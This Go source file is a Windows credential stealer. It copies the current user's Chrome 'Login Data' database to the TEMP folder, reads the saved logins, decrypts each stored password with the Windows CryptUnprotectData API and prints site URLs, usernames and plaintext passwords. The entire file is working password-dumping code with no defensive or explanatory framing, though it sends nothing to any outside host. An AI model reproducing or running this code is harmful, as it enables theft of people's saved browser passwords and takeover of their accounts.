package main

import (
	"strings"
  "os/user"
  "database/sql"
	_ "github.com/mattn/go-sqlite3"
  "unsafe"
  "syscall"
  "fmt"
  "os"
  "io"
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

var (
  dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
  dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
  procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
  procLocalFree   = dllkernel32.NewProc("LocalFree")
)

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func getChrome() (string) {
	currUser, _ := user.Current()
	var url string
	var username string
	var password string
	var out string
  // Copy 'Login Data' to TEMP folder
	var loginData string = "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
  var loginDataCopy string = "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Temp\\Login Data"
  err := copyFile(loginData, loginDataCopy)
  path := "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Temp\\Login Data"
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return err.Error()
	}
	rows, err := db.Query("SELECT origin_url,username_value,password_value from logins;")
	if err != nil {
		return err.Error()
	}
	for rows.Next() {
		rows.Scan(&url, &username, &password)
		pwd, err := Decrypt([]byte(password))
		if err != nil {
			out += "err:" + err.Error()
		}
		out += "uri:\"" + url + "\"; username: " + username + "; password: " + string(pwd) + "\n"
	}
	return out
}

func copyFile(src, dst string) error {
	s, err := os.Open(src)
	if err != nil {
		return err
	}
	// no need to check errors on read only file, we already got everything
	// we need from the filesystem, so nothing can go wrong now.
	defer s.Close()
	d, err := os.Create(dst)
	if err != nil {
		return err
	}
	if _, err := io.Copy(d, s); err != nil {
		d.Close()
		return err
	}
	return d.Close()
}

func main() {
  fmt.Println(getChrome())
}
